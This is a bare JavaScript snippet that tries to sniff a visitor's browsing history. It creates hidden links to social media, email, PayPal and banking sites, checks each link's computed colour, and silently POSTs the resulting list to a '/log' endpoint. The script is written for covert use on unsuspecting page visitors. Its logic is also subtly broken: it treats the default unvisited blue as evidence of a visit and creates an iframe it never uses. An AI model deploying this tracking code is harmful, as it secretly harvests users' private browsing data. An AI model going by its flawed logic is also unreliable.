(function () {
    const targets = [
        "https://facebook.com",
        "https://twitter.com",
        "https://instagram.com",
        "https://gmail.com",
        "https://tiktok.com",
        "https://paypal.com",
        "https://outlook.com",
        "https://bankofamerica.com"
    ];

    const visited = [];

    const iframe = document.createElement("iframe");
    document.body.appendChild(iframe);

    targets.forEach(url => {
        const link = document.createElement("a");
        link.href = url;
        link.textContent = "check";
        link.style.display = "none";
        document.body.appendChild(link);

        const computed = window.getComputedStyle(link);
        if (computed.getPropertyValue("color") === "rgb(0, 0, 255)") {
            visited.push(url);
        }

        link.remove();
    });

    fetch("/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            type: "history",
            data: visited
        })
    });
})();
